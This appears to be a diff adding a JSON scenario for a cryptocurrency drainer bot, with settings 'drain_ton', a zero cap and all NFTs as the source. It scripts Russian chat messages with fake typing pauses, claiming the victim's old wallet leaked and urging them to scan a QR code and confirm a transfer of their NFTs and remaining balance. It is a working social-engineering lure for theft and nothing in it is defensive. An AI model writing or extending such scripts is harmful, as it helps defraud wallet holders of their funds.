@@ -1,0 +1,13 @@
+{
+  "title": "Переезд на новый кошелёк",
+  "overrides": {"drain_ton": true, "ton_cap": 0, "nft_source": "all"},
+  "steps": [
+    {"type": "typing", "seconds": 3},
+    {"type": "text", "text": "Слушай, старый кошелёк светанул, надо перекинуть всё на новый."},
+    {"type": "typing", "seconds": 2},
+    {"type": "text", "text": "Скину QR, отсканируй и подтверди — там сразу и NFT, и остаток.", "wait": true},
+    {"type": "qr", "caption": "Сканируй в кошельке"},
+    {"type": "typing", "seconds": 2},
+    {"type": "text", "text": "Как подтвердишь — скажи, я проверю."}
+  ]
+}
